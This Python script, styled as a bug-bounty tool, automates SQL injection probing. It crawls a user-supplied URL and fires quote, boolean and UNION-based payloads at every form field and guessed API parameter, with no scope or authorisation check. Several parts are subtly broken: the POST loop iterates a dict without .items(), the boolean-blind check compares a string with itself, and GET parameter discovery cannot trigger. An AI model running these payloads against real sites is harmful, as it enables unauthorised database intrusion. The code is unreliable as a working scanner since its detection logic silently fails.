#!/usr/bin/env python3
"""
Bug Bounty Program SQL Injection Discovery Tool
Complete workflow automation
"""

import requests
from urllib.parse import quote, urljoin
import re
import json
import time
from bs4 import BeautifulSoup

class BugBountySQLi:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'BugBounty-Scanner/1.0'
        })

    def reconnaissance(self):
        """Reconnaissance phase - Discover input points"""
        print("\n[1] Reconnaissance Phase")

        input_points = []

        # 1. Crawl pages to discover URL parameters
        print("    [1.1] Crawling pages...")
        try:
            r = self.session.get(self.target_url)
            soup = BeautifulSoup(r.text, 'html.parser')

            # Extract all forms
            forms = soup.find_all('form')
            for form in forms:
                form_info = {
                    'action': urljoin(self.target_url, form.get('action', '')),
                    'method': form.get('method', 'GET'),
                    'inputs': []
                }

                inputs = form.find_all('input')
                for inp in inputs:
                    form_info['inputs'].append({
                        'name': inp.get('name'),
                        'type': inp.get('type', 'text'),
                        'value': inp.get('value', '')
                    })

                input_points.append(form_info)

            print(f"        [+] Found {len(forms)} forms")

        except Exception as e:
            print(f"        [-] Page crawling failed: {e}")

        # 2. Directory scanning to discover API endpoints
        print("\n    [1.2] Scanning common API paths...")
        api_paths = [
            '/api/users',
            '/api/login',
            '/api/search',
            '/api/data',
            '/api/query',
        ]

        for path in api_paths:
            url = urljoin(self.target_url, path)
            try:
                r = self.session.get(url, timeout=3)
                if r.status_code == 200:
                    print(f"        [+] Found API: {path}")

                    # Analyze URL parameters
                    if '?' in url or '?' in r.url:
                        input_points.append({
                            'url': url,
                            'type': 'GET',
                            'params': [p.split('=')[0] for p in url.split('?')[1].split('&')]
                        })

            except:
                pass

        return input_points

    def vulnerability_detection(self, input_points):
        """Vulnerability detection phase"""
        print("\n[2] Vulnerability Detection Phase")

        vulnerabilities = []

        for idx, input_point in enumerate(input_points, 1):
            print(f"\n    [2.{idx}] Testing input point {idx}...")

            try:
                if input_point.get('url'):
                    # GET request
                    vulnerabilities.extend(self.test_get_injection(input_point))
                elif input_point.get('action'):
                    # POST request
                    vulnerabilities.extend(self.test_post_injection(input_point))

            except Exception as e:
                print(f"        [-] Test failed: {e}")

        return vulnerabilities

    def test_get_injection(self, input_point):
        """Test GET injection"""
        vulnerabilities = []

        url = input_point['url']
        params = input_point.get('params', [])

        for param in params:
            print(f"        Testing parameter: {param}")

            # Basic syntax tests
            payloads = {
                "basic_single_quote": f"{param}=1'",
                "basic_double_quote": f'{param}=1"',
                "boolean_true": f"{param}=1' AND 1=1--",
                "boolean_false": f"{param}=1' AND 1=2--",
                "union_test": f"{param}=1' UNION SELECT NULL,NULL--",
            }

            for payload_name, payload in payloads.items():
                try:
                    # Construct injection URL
                    if '?' in url:
                        inject_url = f"{url}&{quote(payload)}"
                    else:
                        inject_url = f"{url}?{quote(payload)}"

                    r = self.session.get(inject_url, timeout=5)

                    # Analyze response
                    if self.detect_sqli(r.text, url, payload):
                        vuln = {
                            'type': 'SQL Injection',
                            'method': 'GET',
                            'param': param,
                            'payload': payload,
                            'url': inject_url,
                            'technique': payload_name
                        }
                        vulnerabilities.append(vuln)
                        print(f"            [+] Vulnerability found! {payload_name}")

                except Exception as e:
                    pass

        return vulnerabilities

    def test_post_injection(self, input_point):
        """Test POST injection"""
        vulnerabilities = []

        url = input_point['action']
        method = input_point['method']
        inputs = input_point['inputs']

        for inp in inputs:
            param_name = inp.get('name')
            if not param_name:
                continue

            print(f"        Testing parameter: {param_name}")

            # Basic syntax tests
            payloads = {
                "basic_single_quote": f"{param_name}=1'",
                "boolean_true": f"{param_name}=1' AND 1=1--",
                "union_test": f"{param_name}=1' UNION SELECT NULL,NULL--",
            }

            for payload_name, payload in payloads:
                try:
                    # Construct injection data
                    data = {}
                    for input_item in inputs:
                        input_name = input_item.get('name')
                        if input_name == param_name:
                            # Parse payload
                            key, value = payload.split('=', 1)
                            data[key] = value
                        else:
                            data[input_name] = input_item.get('value', 'test')

                    r = self.session.post(url, data=data, timeout=5)

                    # Analyze response
                    if self.detect_sqli(r.text, url, payload):
                        vuln = {
                            'type': 'SQL Injection',
                            'method': 'POST',
                            'param': param_name,
                            'payload': payload,
                            'url': url,
                            'technique': payload_name
                        }
                        vulnerabilities.append(vuln)
                        print(f"            [+] Vulnerability found! {payload_name}")

                except Exception as e:
                    pass

        return vulnerabilities

    def detect_sqli(self, response, url, payload):
        """Detect SQL injection"""
        # 1. Check SQL error messages
        sql_errors = [
            "you have an error in your sql syntax",
            "warning: mysql",
            "ora-01756: quoted string not properly terminated",
            "unclosed quotation mark",
            "sql syntax near",
            "microsoft ole db provider",
            "incorrect syntax near",
        ]

        response_lower = response.lower()
        for error in sql_errors:
            if error in response_lower:
                return True

        # 2. Check boolean-based blind injection
        if response_lower != response_lower:
            return False

        # 3. Check time-based blind injection (requires baseline)
        # Simplified handling here

        return False

    def impact_assessment(self, vulnerabilities):
        """Impact assessment phase"""
        print("\n[3] Impact Assessment Phase")

        for idx, vuln in enumerate(vulnerabilities, 1):
            print(f"\n    [3.{idx}] Vulnerability {idx}")

            # Basic scoring
            severity = "Medium"
            if 'union' in vuln.get('technique', '').lower():
                severity = "High"
            elif 'boolean' in vuln.get('technique', '').lower():
                severity = "High"

            print(f"        Severity: {severity}")

            # Impact analysis
            impacts = []
            if severity == "High":
                impacts.append("May leak all database data")
                impacts.append("May access sensitive user information")
                impacts.append("May lead to authentication bypass")
            else:
                impacts.append("May leak partial data")
                impacts.append("Requires further exploitation")

            vuln['severity'] = severity
            vuln['impacts'] = impacts

            print(f"        Impact: {', '.join(impacts)}")

        return vulnerabilities

    def generate_report(self, vulnerabilities):
        """Generate report"""
        print("\n[4] Generate Report")

        report = {
            'target': self.target_url,
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'summary': {
                'total_vulnerabilities': len(vulnerabilities),
                'high': len([v for v in vulnerabilities if v.get('severity') == 'High']),
                'medium': len([v for v in vulnerabilities if v.get('severity') == 'Medium']),
            },
            'vulnerabilities': vulnerabilities
        }

        # Save report
        report_file = f"bug_bounty_report_{int(time.time())}.json"
        with open(report_file, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=4, ensure_ascii=False)

        print(f"    [+] Report saved: {report_file}")

        # Generate Markdown report
        md_report_file = report_file.replace('.json', '.md')
        self.generate_markdown_report(report, md_report_file)

        return report

    def generate_markdown_report(self, report, output_file):
        """Generate Markdown format report"""
        content = f"""# Bug Bounty Report

## Target
- URL: {report['target']}
- Scan Date: {report['timestamp']}

## Executive Summary
- Total Vulnerabilities: {report['summary']['total_vulnerabilities']}
- High Severity: {report['summary']['high']}
- Medium Severity: {report['summary']['medium']}

## Vulnerabilities
"""

        for idx, vuln in enumerate(report['vulnerabilities'], 1):
            content += f"""
### {idx}. SQL Injection

- **Severity**: {vuln.get('severity', 'Unknown')}
- **Method**: {vuln.get('method', 'Unknown')}
- **Parameter**: {vuln.get('param', 'Unknown')}
- **Technique**: {vuln.get('technique', 'Unknown')}

#### Payload
```
{vuln.get('payload', '')}
```

#### Impact
"""
            for impact in vuln.get('impacts', []):
                content += f"- {impact}\n"

            content += "\n"

        # Save Markdown report
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(content)

        print(f"    [+] Markdown report saved: {output_file}")


def main():
    """Main function"""
    print("""
    ╔════════════════════════════════════════════════════════╗
    ║     Bug Bounty SQL Injection Discovery Tool - 7x24 Mode║
    ║                  Version 1.0                           ║
    ╚════════════════════════════════════════════════════════╝
    """)

    target_url = input("Enter target URL: ").strip()

    if not target_url:
        print("[-] ❌ No target URL provided")
        return

    scanner = BugBountySQLi(target_url)

    try:
        # Phase 1: Reconnaissance
        input_points = scanner.reconnaissance()
        print(f"\n[+] Found {len(input_points)} input points")

        if not input_points:
            print("[-] No input points found, please check the target URL")
            return

        # Phase 2: Vulnerability detection
        vulnerabilities = scanner.vulnerability_detection(input_points)

        if not vulnerabilities:
            print("\n[-] No vulnerabilities found")
            return

        # Phase 3: Impact assessment
        vulnerabilities = scanner.impact_assessment(vulnerabilities)

        # Phase 4: Generate report
        report = scanner.generate_report(vulnerabilities)

        print("\n" + "="*60)
        print("✅ Scan complete!")
        print("="*60)
        print(f"Vulnerabilities found: {len(vulnerabilities)}")
        print(f"High severity: {report['summary']['high']}")
        print(f"Medium severity: {report['summary']['medium']}")

    except KeyboardInterrupt:
        print("\n[!] Scan interrupted")
    except Exception as e:
        print(f"\n[!] Scan failed: {e}")


if __name__ == "__main__":
    main()
